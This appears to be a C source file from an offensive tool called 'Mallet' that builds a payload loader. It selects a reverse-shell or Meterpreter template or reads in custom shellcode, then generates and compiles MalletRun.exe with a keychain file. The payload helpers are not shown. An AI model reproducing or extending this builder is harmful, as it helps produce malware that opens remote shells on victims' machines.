#include <stdio.h>
#include "Common.h"

void Mallet(struct UserOptions sMenuOptions)
{
	// Check for MalletRun.sln
	//FILE* fMallet = fopen("MalletRun.sln", "r");
	//if (fMallet == NULL)
	//{
	//	MessageBox(NULL, L"Unable to locate MalletRun.sln. Check your working directory.", NULL, MB_OK);
	//}
	//else {
	//	fclose(fMallet);
	//}

	// Clear keychain
	FILE* fKeychain = fopen("..\\..\\..\\Output\\keychain.txt", "w");
	fprintf(fKeychain, "");
	fclose(fKeychain);

	// Determine payload mode and load it in

	PVOID pPayload = NULL;
	SIZE_T sPayloadSize = NULL;

	switch (sMenuOptions.cPayloadMode)
	{
	case 1: // Template mode

		switch (sMenuOptions.cTemplate)
		{
		case 1: // Reverse shell
			RevshellPayload(&pPayload, &sPayloadSize, sMenuOptions);
			break;

		case 2: // Meterpreter
			MeterpreterPayload(&pPayload, &sPayloadSize, sMenuOptions);
			break;
		}

		break;
	case 2: // Custom. Read in...
		char* temp = (sMenuOptions.sPayloadName).data(); // stupid
		ReadShellcode(temp, &pPayload, &sPayloadSize);
		break;
	}

	Generate(pPayload, sPayloadSize, sMenuOptions);
	Compile();

	MessageBox(NULL, L"MalletRun.exe compiled and keychain written to keychain.txt.", L"Success", MB_OK);

	exit(0);
}